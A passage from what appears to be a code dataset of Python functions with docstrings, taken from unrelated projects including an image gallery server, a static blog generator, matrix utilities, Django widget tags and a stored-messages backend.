            "def _clean_up(paths):\n    \"\"\"\n    Clean up after ourselves, removing created files.\n    @param {[String]} A list of file paths specifying the files we've created\n        during run. Will all be deleted.\n    @return {None}\n    \"\"\"\n    print('Cleaning up')\n    # Iterate over the given paths, unlinking them\n    for path in paths:\n        print('Removing %s' % path)\n        os.unlink(path)"
        ],
        [
            "def _create_index_file(\n        root_dir, location, image_files, dirs, force_no_processing=False):\n    \"\"\"\n    Create an index file in the given location, supplying known lists of\n    present image files and subdirectories.\n    @param {String} root_dir - The root directory of the entire crawl. Used to\n        ascertain whether the given location is the top level.\n    @param {String} location - The current directory of the crawl. The index\n        file will be created here.\n    @param {[String]} image_files - A list of image file names in the location.\n        These will be displayed in the index file's gallery.\n    @param {[String]} dirs - The subdirectories of the location directory.\n        These will be displayed as links further down the file structure.\n    @param {Boolean=False} force_no_processing - If True, do not attempt to\n        actually process thumbnails, PIL images or anything. Simply index\n        <img> tags with original file src attributes.\n    @return {String} The full path (location plus filename) of the newly\n        created index file. Intended for usage cleaning up created files.\n    \"\"\"\n    # Put together HTML as a list of the lines we'll want to include\n    # Issue #2 exists to do this better than HTML in-code\n    header_text = \\\n        'imageMe: ' + location + ' [' + str(len(image_files)) + ' image(s)]'\n    html = [\n        '<!DOCTYPE html>',\n        '<html>',\n        '    <head>',\n        '        <title>imageMe</title>'\n        '        <style>',\n        '            html, body {margin: 0;padding: 0;}',\n        '            .header {text-align: right;}',\n        '            .content {',\n        '                padding: 3em;',\n        '                padding-left: 4em;',\n        '                padding-right: 4em;',\n        '            }',\n        '            .image {max-width: 100%; border-radius: 0.3em;}',\n        '            td {width: ' + str(100.0 / IMAGES_PER_ROW) + '%;}',\n        '        </style>',\n        '    </head>',\n        '    <body>',\n        '    <div class=\"content\">',\n        '        <h2 class=\"header\">' + header_text + '</h2>'\n    ]\n    # Populate the present subdirectories - this includes '..' unless we're at\n    # the top level\n    directories = []\n    if root_dir != location:\n        directories = ['..']\n    directories += dirs\n    if len(directories) > 0:\n        html.append('<hr>')\n    # For each subdirectory, include a link to its index file\n    for directory in directories:\n        link = directory + '/' + INDEX_FILE_NAME\n        html += [\n            '    <h3 class=\"header\">',\n            '    <a href=\"' + link + '\">' + directory + '</a>',\n            '    </h3>'\n        ]\n    # Populate the image gallery table\n    # Counter to cycle down through table rows\n    table_row_count = 1\n    html += ['<hr>', '<table>']\n    # For each image file, potentially create a new <tr> and create a new <td>\n    for image_file in image_files:\n        if table_row_count == 1:\n            html.append('<tr>')\n        img_src = _get_thumbnail_src_from_file(\n            location, image_file, force_no_processing\n        )\n        link_target = _get_image_link_target_from_file(\n            location, image_file, force_no_processing\n        )\n        html += [\n            '    <td>',\n            '    <a href=\"' + link_target + '\">',\n            '        <img class=\"image\" src=\"' + img_src + '\">',\n            '    </a>',\n            '    </td>'\n        ]\n        if table_row_count == IMAGES_PER_ROW:\n            table_row_count = 0\n            html.append('</tr>')\n        table_row_count += 1\n    html += ['</tr>', '</table>']\n    html += [\n        '    </div>',\n        '    </body>',\n        '</html>'\n    ]\n    # Actually create the file, now we've put together the HTML content\n    index_file_path = _get_index_file_path(location)\n    print('Creating index file %s' % index_file_path)\n    index_file = open(index_file_path, 'w')\n    index_file.write('\\n'.join(html))\n    index_file.close()\n    # Return the path for cleaning up later\n    return index_file_path"
        ],
        [
            "def _create_index_files(root_dir, force_no_processing=False):\n    \"\"\"\n    Crawl the root directory downwards, generating an index HTML file in each\n    directory on the way down.\n    @param {String} root_dir - The top level directory to crawl down from. In\n        normal usage, this will be '.'.\n    @param {Boolean=False} force_no_processing - If True, do not attempt to\n        actually process thumbnails, PIL images or anything. Simply index\n        <img> tags with original file src attributes.\n    @return {[String]} Full file paths of all created files.\n    \"\"\"\n    # Initialise list of created file paths to build up as we make them\n    created_files = []\n    # Walk the root dir downwards, creating index files as we go\n    for here, dirs, files in os.walk(root_dir):\n        print('Processing %s' % here)\n        # Sort the subdirectories by name\n        dirs = sorted(dirs)\n        # Get image files - all files in the directory matching IMAGE_FILE_REGEX\n        image_files = [f for f in files if re.match(IMAGE_FILE_REGEX, f)]\n        # Sort the image files by name\n        image_files = sorted(image_files)\n        # Create this directory's index file and add its name to the created\n        # files list\n        created_files.append(\n            _create_index_file(\n                root_dir, here, image_files, dirs, force_no_processing\n            )\n        )\n    # Return the list of created files\n    return created_files"
        ],
        [
            "def _get_image_from_file(dir_path, image_file):\n    \"\"\"\n    Get an instance of PIL.Image from the given file.\n    @param {String} dir_path - The directory containing the image file\n    @param {String} image_file - The filename of the image file within dir_path\n    @return {PIL.Image} An instance of the image file as a PIL Image, or None\n        if the functionality is not available. This could be because PIL is not\n        present, or because it can't process the given file type.\n    \"\"\"\n    # Save ourselves the effort if PIL is not present, and return None now\n    if not PIL_ENABLED:\n        return None\n    # Put together full path\n    path = os.path.join(dir_path, image_file)\n    # Try to read the image\n    img = None\n    try:\n        img = Image.open(path)\n    except IOError as exptn:\n        print('Error loading image file %s: %s' % (path, exptn))\n    # Return image or None\n    return img"
        ],
        [
            "def _get_src_from_image(img, fallback_image_file):\n    \"\"\"\n    Get base-64 encoded data as a string for the given image. Fallback to return\n    fallback_image_file if cannot get the image data or img is None.\n    @param {Image} img - The PIL Image to get src data for\n    @param {String} fallback_image_file - The filename of the image file,\n        to be used when image data capture fails\n    @return {String} The base-64 encoded image data string, or path to the file\n        itself if not supported.\n    \"\"\"\n    # If the image is None, then we can't process, so we should return the\n    # path to the file itself\n    if img is None:\n        return fallback_image_file\n    # Target format should be the same as the original image format, unless it's\n    # a TIF/TIFF, which can't be displayed by most browsers; we convert these\n    # to jpeg\n    target_format = img.format\n    if target_format.lower() in ['tif', 'tiff']:\n        target_format = 'JPEG'\n    # If we have an actual Image, great - put together the base64 image string\n    try:\n        bytesio = io.BytesIO()\n        img.save(bytesio, target_format)\n        byte_value = bytesio.getvalue()\n        b64 = base64.b64encode(byte_value)\n        return 'data:image/%s;base64,%s' % (target_format.lower(), b64)\n    except IOError as exptn:\n        print('IOError while saving image bytes: %s' % exptn)\n        return fallback_image_file"
        ],
        [
            "def _get_thumbnail_image_from_file(dir_path, image_file):\n    \"\"\"\n    Get a PIL.Image from the given image file which has been scaled down to\n    THUMBNAIL_WIDTH wide.\n    @param {String} dir_path - The directory containing the image file\n    @param {String} image_file - The filename of the image file within dir_path\n    @return {PIL.Image} An instance of the thumbnail as a PIL Image, or None\n        if the functionality is not available. See _get_image_from_file for\n        details.\n    \"\"\"\n    # Get image\n    img = _get_image_from_file(dir_path, image_file)\n    # If it's not supported, exit now\n    if img is None:\n        return None\n    if img.format.lower() == 'gif':\n        return None\n    # Get image dimensions\n    img_width, img_height = img.size\n    # We need to perform a resize - first, work out the scale ratio to take the\n    # image width to THUMBNAIL_WIDTH (THUMBNAIL_WIDTH:img_width ratio)\n    scale_ratio = THUMBNAIL_WIDTH / float(img_width)\n    # Work out target image height based on the scale ratio\n    target_height = int(scale_ratio * img_height)\n    # Perform the resize\n    try:\n        img.thumbnail((THUMBNAIL_WIDTH, target_height), resample=RESAMPLE)\n    except IOError as exptn:\n        print('WARNING: IOError when thumbnailing %s/%s: %s' % (\n            dir_path, image_file, exptn\n        ))\n        return None\n    # Return the resized image\n    return img"
        ],
        [
            "def _run_server():\n    \"\"\"\n    Run the image server. This is blocking. Will handle user KeyboardInterrupt\n    and other exceptions appropriately and return control once the server is\n    stopped.\n    @return {None}\n    \"\"\"\n    # Get the port to run on\n    port = _get_server_port()\n    # Configure allow_reuse_address to make re-runs of the script less painful -\n    # if this is not True then waiting for the address to be freed after the\n    # last run can block a subsequent run\n    SocketServer.TCPServer.allow_reuse_address = True\n    # Create the server instance\n    server = SocketServer.TCPServer(\n        ('', port),\n        SimpleHTTPServer.SimpleHTTPRequestHandler\n    )\n    # Print out before actually running the server (cheeky / optimistic, however\n    # you want to look at it)\n    print('Your images are at http://127.0.0.1:%d/%s' % (\n        port,\n        INDEX_FILE_NAME\n    ))\n    # Try to run the server\n    try:\n        # Run it - this call blocks until the server is killed\n        server.serve_forever()\n    except KeyboardInterrupt:\n        # This is the expected way of the server being killed, since imageMe is\n        # intended for ad-hoc running from command line\n        print('User interrupted, stopping')\n    except Exception as exptn:\n        # Catch everything else - this will handle shutdowns via other signals\n        # and faults actually starting the server in the first place\n        print(exptn)\n        print('Unhandled exception in server, stopping')"
        ],
        [
            "def serve_dir(dir_path):\n    \"\"\"\n    Generate indexes and run server from the given directory downwards.\n    @param {String} dir_path - The directory path (absolute, or relative to CWD)\n    @return {None}\n    \"\"\"\n    # Create index files, and store the list of their paths for cleanup later\n    # This time, force no processing - this gives us a fast first-pass in terms\n    # of page generation, but potentially slow serving for large image files\n    print('Performing first pass index file generation')\n    created_files = _create_index_files(dir_path, True)\n    if (PIL_ENABLED):\n        # If PIL is enabled, we'd like to process the HTML indexes to include\n        # generated thumbnails - this slows down generation so we don't do it\n        # first time around, but now we're serving it's good to do in the\n        # background\n        print('Performing PIL-enchanced optimised index file generation in background')\n        background_indexer = BackgroundIndexFileGenerator(dir_path)\n        background_indexer.run()\n    # Run the server in the current location - this blocks until it's stopped\n    _run_server()\n    # Clean up the index files created earlier so we don't make a mess of\n    # the image directories\n    _clean_up(created_files)"
        ],
        [
            "def static(**kwargs):\n    \"\"\" USE carefully ^^ \"\"\"\n    def wrap(fn):\n        fn.func_globals['static'] = fn\n        fn.__dict__.update(kwargs)\n        return fn\n    return wrap"
        ],
        [
            "def rand_blend_mask(shape, rand=rand.uniform(-10, 10), **kwargs):\n    \"\"\" random blending masks \"\"\"\n    # batch, channel = shape[0], shape[3]\n    z = rand(shape[0])  # seed\n    noise = snoise2dz((shape[1], shape[2]), z, **kwargs)\n\n    return noise"
        ],
        [
            "def snoise2d(size, z=0.0, scale=0.05, octaves=1, persistence=0.25, lacunarity=2.0):\n    \"\"\"\n    z value as like a seed\n    \"\"\"\n    import noise\n    data = np.empty(size, dtype='float32')\n    for y in range(size[0]):\n        for x in range(size[1]):\n            v = noise.snoise3(x * scale, y * scale, z,\n                              octaves=octaves, persistence=persistence, lacunarity=lacunarity)\n            data[x, y] = v\n    data = data * 0.5 + 0.5\n    if __debug__:\n        assert data.min() >= 0. and data.max() <= 1.0\n    return data"
        ],
        [
            "def to_permutation_matrix(matches):\n    \"\"\"Converts a permutation into a permutation matrix.\n\n    `matches` is a dictionary whose keys are vertices and whose values are\n    partners. For each vertex ``u`` and ``v``, entry (``u``, ``v``) in the\n    returned matrix will be a ``1`` if and only if ``matches[u] == v``.\n\n    Pre-condition: `matches` must be a permutation on an initial subset of the\n    natural numbers.\n\n    Returns a permutation matrix as a square NumPy array.\n\n    \"\"\"\n    n = len(matches)\n    P = np.zeros((n, n))\n    # This is a cleverer way of doing\n    #\n    #     for (u, v) in matches.items():\n    #         P[u, v] = 1\n    #\n    P[list(zip(*(matches.items())))] = 1\n    return P"
        ],
        [
            "def four_blocks(topleft, topright, bottomleft, bottomright):\n    \"\"\"Convenience function that creates a block matrix with the specified\n    blocks.\n\n    Each argument must be a NumPy matrix. The two top matrices must have the\n    same number of rows, as must the two bottom matrices. The two left matrices\n    must have the same number of columns, as must the two right matrices.\n\n    \"\"\"\n    return vstack(hstack(topleft, topright),\n                  hstack(bottomleft, bottomright))"
        ],
        [
            "def to_bipartite_matrix(A):\n    \"\"\"Returns the adjacency matrix of a bipartite graph whose biadjacency\n    matrix is `A`.\n\n    `A` must be a NumPy array.\n\n    If `A` has **m** rows and **n** columns, then the returned matrix has **m +\n    n** rows and columns.\n\n    \"\"\"\n    m, n = A.shape\n    return four_blocks(zeros(m, m), A, A.T, zeros(n, n))"
        ],
        [
            "def to_pattern_matrix(D):\n    \"\"\"Returns the Boolean matrix in the same shape as `D` with ones exactly\n    where there are nonzero entries in `D`.\n\n    `D` must be a NumPy array.\n\n    \"\"\"\n    result = np.zeros_like(D)\n    # This is a cleverer way of doing\n    #\n    #     for (u, v) in zip(*(D.nonzero())):\n    #         result[u, v] = 1\n    #\n    result[D.nonzero()] = 1\n    return result"
        ],
        [
            "def bump_version(version, which=None):\n    \"\"\"Returns the result of incrementing `version`.\n\n    If `which` is not specified, the \"patch\" part of the version number will be\n    incremented.  If `which` is specified, it must be ``'major'``, ``'minor'``,\n    or ``'patch'``. If it is one of these three strings, the corresponding part\n    of the version number will be incremented instead of the patch number.\n\n    Returns a string representing the next version number.\n\n    Example::\n\n        >>> bump_version('2.7.1')\n        '2.7.2'\n        >>> bump_version('2.7.1', 'minor')\n        '2.8.0'\n        >>> bump_version('2.7.1', 'major')\n        '3.0.0'\n\n    \"\"\"\n    try:\n        parts = [int(n) for n in version.split('.')]\n    except ValueError:\n        fail('Current version is not numeric')\n    if len(parts) != 3:\n        fail('Current version is not semantic versioning')\n    # Determine where to increment the version number\n    PARTS = {'major': 0, 'minor': 1, 'patch': 2}\n    index = PARTS[which] if which in PARTS else 2\n    # Increment the version number at that index and set the subsequent parts\n    # to 0.\n    before, middle, after = parts[:index], parts[index], parts[index + 1:]\n    middle += 1\n    return '.'.join(str(n) for n in before + [middle] + after)"
        ],
        [
            "def get_version(filename, pattern):\n    \"\"\"Gets the current version from the specified file.\n\n    This function assumes the file includes a string of the form::\n\n        <pattern> = <version>\n\n    \"\"\"\n    with open(filename) as f:\n        match = re.search(r\"^(\\s*%s\\s*=\\s*')(.+?)(')(?sm)\" % pattern, f.read())\n    if match:\n        before, version, after = match.groups()\n        return version\n    fail('Could not find {} in {}'.format(pattern, filename))"
        ],
        [
            "def fail(message=None, exit_status=None):\n    \"\"\"Prints the specified message and exits the program with the specified\n    exit status.\n\n    \"\"\"\n    print('Error:', message, file=sys.stderr)\n    sys.exit(exit_status or 1)"
        ],
        [
            "def git_tag(tag):\n    \"\"\"Tags the current version.\"\"\"\n    print('Tagging \"{}\"'.format(tag))\n    msg = '\"Released version {}\"'.format(tag)\n    Popen(['git', 'tag', '-s', '-m', msg, tag]).wait()"
        ],
        [
            "def initialize(self, templates_path, global_data):\n        \"\"\"initialize with templates' path\n        parameters\n          templates_path    str    the position of templates directory\n          global_data       dict   globa data can be got in any templates\"\"\"\n        self.env = Environment(loader=FileSystemLoader(templates_path))\n        self.env.trim_blocks = True\n        self.global_data = global_data"
        ],
        [
            "def render(self, template, **data):\n        \"\"\"Render data with template, return html unicodes.\n        parameters\n          template   str  the template's filename\n          data       dict the data to render\n        \"\"\"\n        # make a copy and update the copy\n        dct = self.global_data.copy()\n        dct.update(data)\n\n        try:\n            html = self.env.get_template(template).render(**dct)\n        except TemplateNotFound:\n            raise JinjaTemplateNotFound\n        return html"
        ],
        [
            "def render_to(self, path, template, **data):\n        \"\"\"Render data with template and then write to path\"\"\"\n        html = self.render(template, **data)\n        with open(path, 'w') as f:\n            f.write(html.encode(charset))"
        ],
        [
            "def render(template, **data):\n    \"\"\"shortcut to render data with `template`. Just add exception\n    catch to `renderer.render`\"\"\"\n    try:\n        return renderer.render(template, **data)\n    except JinjaTemplateNotFound as e:\n        logger.error(e.__doc__ + ', Template: %r' % template)\n        sys.exit(e.exit_code)"
        ],
        [
            "def get_dataframe(self):\n        \"\"\"\n        Get the DataFrame for this view.\n        Defaults to using `self.dataframe`.\n\n        This method should always be used rather than accessing `self.dataframe`\n        directly, as `self.dataframe` gets evaluated only once, and those results\n        are cached for all subsequent requests.\n\n        You may want to override this if you need to provide different\n        dataframes depending on the incoming request.\n        \"\"\"\n        assert self.dataframe is not None, (\n            \"'%s' should either include a `dataframe` attribute, \"\n            \"or override the `get_dataframe()` method.\"\n            % self.__class__.__name__\n        )\n\n        dataframe = self.dataframe\n        return dataframe"
        ],
        [
            "def index_row(self, dataframe):\n        \"\"\"\n        Indexes the row based on the request parameters.\n        \"\"\"\n        return dataframe.loc[self.kwargs[self.lookup_url_kwarg]].to_frame().T"
        ],
        [
            "def get_object(self):\n        \"\"\"\n        Returns the row the view is displaying.\n\n        You may want to override this if you need to provide non-standard\n        queryset lookups.  Eg if objects are referenced using multiple\n        keyword arguments in the url conf.\n        \"\"\"\n        dataframe = self.filter_dataframe(self.get_dataframe())\n\n        assert self.lookup_url_kwarg in self.kwargs, (\n            'Expected view %s to be called with a URL keyword argument '\n            'named \"%s\". Fix your URL conf, or set the `.lookup_field` '\n            'attribute on the view correctly.' %\n            (self.__class__.__name__, self.lookup_url_kwarg)\n        )\n\n        try:\n            obj = self.index_row(dataframe)\n        except (IndexError, KeyError, ValueError):\n            raise Http404\n\n        # May raise a permission denied\n        self.check_object_permissions(self.request, obj)\n\n        return obj"
        ],
        [
            "def paginator(self):\n        \"\"\"\n        The paginator instance associated with the view, or `None`.\n        \"\"\"\n        if not hasattr(self, '_paginator'):\n            if self.pagination_class is None:\n                self._paginator = None\n            else:\n                self._paginator = self.pagination_class()\n        return self._paginator"
        ],
        [
            "def paginate_dataframe(self, dataframe):\n        \"\"\"\n        Return a single page of results, or `None` if pagination is disabled.\n        \"\"\"\n        if self.paginator is None:\n            return None\n        return self.paginator.paginate_dataframe(dataframe, self.request, view=self)"
        ],
        [
            "def parse(self):\n        \"\"\"parse config, return a dict\"\"\"\n\n        if exists(self.filepath):\n            content = open(self.filepath).read().decode(charset)\n        else:\n            content = \"\"\n\n        try:\n            config = toml.loads(content)\n        except toml.TomlSyntaxError:\n            raise ConfigSyntaxError\n\n        return config"
        ],
        [
            "def render_to(path, template, **data):\n    \"\"\"shortcut to render data with `template` and then write to `path`.\n    Just add exception catch to `renderer.render_to`\"\"\"\n    try:\n        renderer.render_to(path, template, **data)\n    except JinjaTemplateNotFound as e:\n        logger.error(e.__doc__ + ', Template: %r' % template)\n        sys.exit(e.exit_code)"
        ],
        [
            "def parse(self, source):\n        \"\"\"Parse ascii post source, return dict\"\"\"\n\n        rt, title, title_pic, markdown = libparser.parse(source)\n\n        if rt == -1:\n            raise SeparatorNotFound\n        elif rt == -2:\n            raise PostTitleNotFound\n\n        # change to unicode\n        title, title_pic, markdown = map(to_unicode, (title, title_pic,\n                                                      markdown))\n\n        # render to html\n        html = self.markdown.render(markdown)\n        summary = self.markdown.render(markdown[:200])\n\n        return {\n            'title': title,\n            'markdown': markdown,\n            'html': html,\n            'summary': summary,\n            'title_pic': title_pic\n        }"
        ],
        [
            "def parse_filename(self, filepath):\n        \"\"\"parse post source files name to datetime object\"\"\"\n        name = os.path.basename(filepath)[:-src_ext_len]\n        try:\n            dt = datetime.strptime(name, \"%Y-%m-%d-%H-%M\")\n        except ValueError:\n            raise PostNameInvalid\n        return {'name': name, 'datetime': dt, 'filepath': filepath}"
        ],
        [
            "def run_server(self, port):\n        \"\"\"run a server binding to port\"\"\"\n\n        try:\n            self.server = MultiThreadedHTTPServer(('0.0.0.0', port), Handler)\n        except socket.error, e:  # failed to bind port\n            logger.error(str(e))\n            sys.exit(1)\n\n        logger.info(\"HTTP serve at http://0.0.0.0:%d (ctrl-c to stop) ...\"\n                    % port)\n\n        try:\n            self.server.serve_forever()\n        except KeyboardInterrupt:\n            logger.info(\"^C received, shutting down server\")\n            self.shutdown_server()"
        ],
        [
            "def get_files_stat(self):\n        \"\"\"get source files' update time\"\"\"\n\n        if not exists(Post.src_dir):\n            logger.error(SourceDirectoryNotFound.__doc__)\n            sys.exit(SourceDirectoryNotFound.exit_code)\n\n        paths = []\n\n        for fn in ls(Post.src_dir):\n            if fn.endswith(src_ext):\n                paths.append(join(Post.src_dir, fn))\n\n        # config.toml\n        if exists(config.filepath):\n            paths.append(config.filepath)\n\n        # files: a <filepath to updated time> dict\n        files = dict((p, stat(p).st_mtime) for p in paths)\n        return files"
        ],
        [
            "def watch_files(self):\n        \"\"\"watch files for changes, if changed, rebuild blog. this thread\n        will quit if the main process ends\"\"\"\n\n        try:\n            while 1:\n                sleep(1)  # check every 1s\n\n                try:\n                    files_stat = self.get_files_stat()\n                except SystemExit:\n                    logger.error(\"Error occurred, server shut down\")\n                    self.shutdown_server()\n\n                if self.files_stat != files_stat:\n                    logger.info(\"Changes detected, start rebuilding..\")\n\n                    try:\n                        generator.re_generate()\n                        global _root\n                        _root = generator.root\n                    except SystemExit:  # catch sys.exit, it means fatal error\n                        logger.error(\"Error occurred, server shut down\")\n                        self.shutdown_server()\n\n                    self.files_stat = files_stat  # update files' stat\n        except KeyboardInterrupt:\n            # I dont know why, but this exception won't be catched\n            # because absolutly each KeyboardInterrupt is catched by\n            # the server thread, which will terminate this thread the same time\n            logger.info(\"^C received, shutting down watcher\")\n            self.shutdown_watcher()"
        ],
        [
            "def deploy_blog():\n    \"\"\"Deploy new blog to current directory\"\"\"\n    logger.info(deploy_blog.__doc__)\n    # `rsync -aqu path/to/res/* .`\n    call(\n        'rsync -aqu ' + join(dirname(__file__), 'res', '*') + ' .',\n        shell=True)\n    logger.success('Done')\n    logger.info('Please edit config.toml to meet your needs')"
        ],
        [
            "def using(context, alias):\n    '''\n    Temporarily update the context to use the BlockContext for the given alias.\n    '''\n\n    # An empty alias means look in the current widget set.\n    if alias == '':\n        yield context\n    else:\n        try:\n            widgets = context.render_context[WIDGET_CONTEXT_KEY]\n        except KeyError:\n            raise template.TemplateSyntaxError('No widget libraries loaded!')\n\n        try:\n            block_set = widgets[alias]\n        except KeyError:\n            raise template.TemplateSyntaxError('No widget library loaded for alias: %r' % alias)\n\n        context.render_context.push()\n        context.render_context[BLOCK_CONTEXT_KEY] = block_set\n        context.render_context[WIDGET_CONTEXT_KEY] = widgets\n\n        yield context\n\n        context.render_context.pop()"
        ],
        [
            "def find_block(context, *names):\n    '''\n    Find the first matching block in the current block_context\n    '''\n    block_set = context.render_context[BLOCK_CONTEXT_KEY]\n    for name in names:\n        block = block_set.get_block(name)\n        if block is not None:\n            return block\n\n    raise template.TemplateSyntaxError('No widget found for: %r' % (names,))"
        ],
        [
            "def load_widgets(context, **kwargs):\n    '''\n    Load a series of widget libraries.\n    '''\n    _soft = kwargs.pop('_soft', False)\n\n    try:\n        widgets = context.render_context[WIDGET_CONTEXT_KEY]\n    except KeyError:\n        widgets = context.render_context[WIDGET_CONTEXT_KEY] = {}\n\n    for alias, template_name in kwargs.items():\n        if _soft and alias in widgets:\n            continue\n\n        with context.render_context.push({BLOCK_CONTEXT_KEY: BlockContext()}):\n            blocks = resolve_blocks(template_name, context)\n            widgets[alias] = blocks\n\n    return ''"
        ],
        [
            "def auto_widget(field):\n    '''Return a list of widget names for the provided field.'''\n    # Auto-detect\n    info = {\n        'widget': field.field.widget.__class__.__name__,\n        'field': field.field.__class__.__name__,\n        'name': field.name,\n    }\n\n    return [\n        fmt.format(**info)\n        for fmt in (\n            '{field}_{widget}_{name}',\n            '{field}_{name}',\n            '{widget}_{name}',\n            '{field}_{widget}',\n            '{name}',\n            '{widget}',\n            '{field}',\n        )\n    ]"
        ],
        [
            "def reuse(context, block_list, **kwargs):\n    '''\n    Allow reuse of a block within a template.\n\n    {% reuse '_myblock' foo=bar %}\n\n    If passed a list of block names, will use the first that matches:\n\n    {% reuse list_of_block_names .... %}\n    '''\n    try:\n        block_context = context.render_context[BLOCK_CONTEXT_KEY]\n    except KeyError:\n        block_context = BlockContext()\n\n    if not isinstance(block_list, (list, tuple)):\n        block_list = [block_list]\n\n    for block in block_list:\n        block = block_context.get_block(block)\n        if block:\n            break\n    else:\n        return ''\n\n    with context.push(kwargs):\n        return block.render(context)"
        ],
        [
            "def display(self):\n        \"\"\"\n        When dealing with optgroups, ensure that the value is properly force_text'd.\n        \"\"\"\n        if not self.is_group():\n            return self._display\n        return ((force_text(k), v) for k, v in self._display)"
        ],
        [
            "def create_message(self, level, msg_text, extra_tags='', date=None, url=None):\n        \"\"\"\n        Message instances are namedtuples of type `Message`.\n        The date field is already serialized in datetime.isoformat ECMA-262 format\n        \"\"\"\n        if not date:\n            now = timezone.now()\n        else:\n            now = date\n        r = now.isoformat()\n        if now.microsecond:\n            r = r[:23] + r[26:]\n        if r.endswith('+00:00'):\n            r = r[:-6] + 'Z'\n\n        fingerprint = r + msg_text\n\n        msg_id = hashlib.sha256(fingerprint.encode('ascii', 'ignore')).hexdigest()\n        return Message(id=msg_id, message=msg_text, level=level, tags=extra_tags, date=r, url=url)"
        ],
        [
            "def add_message_for(users, level, message_text, extra_tags='', date=None, url=None, fail_silently=False):\n    \"\"\"\n    Send a message to a list of users without passing through `django.contrib.messages`\n\n    :param users: an iterable containing the recipients of the messages\n    :param level: message level\n    :param message_text: the string containing the message\n    :param extra_tags: like the Django api, a string containing extra tags for the message\n    :param date: a date, different than the default timezone.now\n    :param url: an optional url\n    :param fail_silently: not used at the moment\n    \"\"\"\n    BackendClass = stored_messages_settings.STORAGE_BACKEND\n    backend = BackendClass()\n    m = backend.create_message(level, message_text, extra_tags, date, url)\n    backend.archive_store(users, m)\n    backend.inbox_store(users, m)"
        ],
        [
            "def broadcast_message(level, message_text, extra_tags='', date=None, url=None, fail_silently=False):\n    \"\"\"\n    Send a message to all users aka broadcast.\n\n    :param level: message level\n    :param message_text: the string containing the message\n    :param extra_tags: like the Django api, a string containing extra tags for the message\n    :param date: a date, different than the default timezone.now\n    :param url: an optional url\n    :param fail_silently: not used at the moment\n    \"\"\"\n    from django.contrib.auth import get_user_model\n    users = get_user_model().objects.all()\n    add_message_for(users, level, message_text, extra_tags=extra_tags, date=date, url=url, fail_silently=fail_silently)"
        ],
        [
            "def mark_read(user, message):\n    \"\"\"\n    Mark message instance as read for user.\n    Returns True if the message was `unread` and thus actually marked as `read` or False in case\n    it is already `read` or it does not exist at all.\n\n    :param user: user instance for the recipient\n    :param message: a Message instance to mark as read\n    \"\"\"\n    BackendClass = stored_messages_settings.STORAGE_BACKEND\n    backend = BackendClass()\n    backend.inbox_delete(user, message)"
        ],
        [
            "def mark_all_read(user):\n    \"\"\"\n    Mark all message instances for a user as read.\n\n    :param user: user instance for the recipient\n    \"\"\"\n    BackendClass = stored_messages_settings.STORAGE_BACKEND\n    backend = BackendClass()\n    backend.inbox_purge(user)"
        ],
        [
            "def stored_messages_archive(context, num_elements=10):\n    \"\"\"\n    Renders a list of archived messages for the current user\n    \"\"\"\n    if \"user\" in context:\n        user = context[\"user\"]\n        if user.is_authenticated():\n            qs = MessageArchive.objects.select_related(\"message\").filter(user=user)\n            return {\n                \"messages\": qs[:num_elements],\n                \"count\": qs.count(),\n            }"
        ],
        [
            "def _get(self, *args, **kwargs):\n        \"\"\"\n        Retrieve unread messages for current user, both from the inbox and\n        from other storages\n        \"\"\"\n        messages, all_retrieved = super(StorageMixin, self)._get(*args, **kwargs)\n        if self.user.is_authenticated():\n            inbox_messages = self.backend.inbox_list(self.user)\n        else:\n            inbox_messages = []\n\n        return messages + inbox_messages, all_retrieved"
        ],
        [
            "def add(self, level, message, extra_tags=''):\n        \"\"\"\n        If the message level was configured for being stored and request.user\n        is not anonymous, save it to the database. Otherwise, let some other\n        class handle the message.\n\n        Notice: controls like checking the message is not empty and the level\n        is above the filter need to be performed here, but it could happen\n        they'll be performed again later if the message does not need to be\n        stored.\n        \"\"\"\n        if not message:\n            return\n        # Check that the message level is not less than the recording level.\n        level = int(level)\n        if level < self.level:\n            return\n        # Check if the message doesn't have a level that needs to be persisted\n        if level not in stored_messages_settings.STORE_LEVELS or self.user.is_anonymous():\n            return super(StorageMixin, self).add(level, message, extra_tags)\n\n        self.added_new = True\n        m = self.backend.create_message(level, message, extra_tags)\n        self.backend.archive_store([self.user], m)\n        self._queued_messages.append(m)"
        ],
        [
            "def _store(self, messages, response, *args, **kwargs):\n        \"\"\"\n        persistent messages are already in the database inside the 'archive',\n        so we can say they're already \"stored\".\n        Here we put them in the inbox, or remove from the inbox in case the\n        messages were iterated.\n\n        messages contains only new msgs if self.used==True\n        else contains both new and unread messages\n        \"\"\"\n        contrib_messages = []\n        if self.user.is_authenticated():\n            if not messages:\n                # erase inbox\n                self.backend.inbox_purge(self.user)\n            else:\n                for m in messages:\n                    try:\n                        self.backend.inbox_store([self.user], m)\n                    except MessageTypeNotSupported:\n                        contrib_messages.append(m)\n\n        super(StorageMixin, self)._store(contrib_messages, response, *args, **kwargs)"
        ],
        [
            "def _prepare_messages(self, messages):\n        \"\"\"\n        Like the base class method, prepares a list of messages for storage\n        but avoid to do this for `models.Message` instances.\n        \"\"\"\n        for message in messages:\n            if not self.backend.can_handle(message):\n                message._prepare()"
        ],
        [
            "def jocker(test_options=None):\n    \"\"\"Main entry point for script.\"\"\"\n    version = ver_check()\n    options = test_options or docopt(__doc__, version=version)\n    _set_global_verbosity_level(options.get('--verbose'))\n    jocker_lgr.debug(options)\n    jocker_run(options)"
        ],
        [
            "def init(base_level=DEFAULT_BASE_LOGGING_LEVEL,\n         verbose_level=DEFAULT_VERBOSE_LOGGING_LEVEL,\n         logging_config=None):\n    \"\"\"initializes a base logger\n\n    you can use this to init a logger in any of your files.\n    this will use config.py's LOGGER param and logging.dictConfig to configure\n    the logger for you.\n\n    :param int|logging.LEVEL base_level: desired base logging level\n    :param int|logging.LEVEL verbose_level: desired verbose logging level\n    :param dict logging_dict: dictConfig based configuration.\n     used to override the default configuration from config.py\n    :rtype: `python logger`\n    \"\"\"\n    if logging_config is None:\n        logging_config = {}\n    logging_config = logging_config or LOGGER\n    # TODO: (IMPRV) only perform file related actions if file handler is\n    # TODO: (IMPRV) defined.\n\n    log_file = LOGGER['handlers']['file']['filename']\n    log_dir = os.path.dirname(os.path.expanduser(log_file))\n    if os.path.isfile(log_dir):\n        sys.exit('file {0} exists - log directory cannot be created '\n                 'there. please remove the file and try again.'\n                 .format(log_dir))\n    try:\n        if not os.path.exists(log_dir) and not len(log_dir) == 0:\n            os.makedirs(log_dir)\n        dictconfig.dictConfig(logging_config)\n        lgr = logging.getLogger('user')\n        lgr.setLevel(base_level)\n        return lgr\n    except ValueError as e:\n        sys.exit('could not initialize logger.'\n                 ' 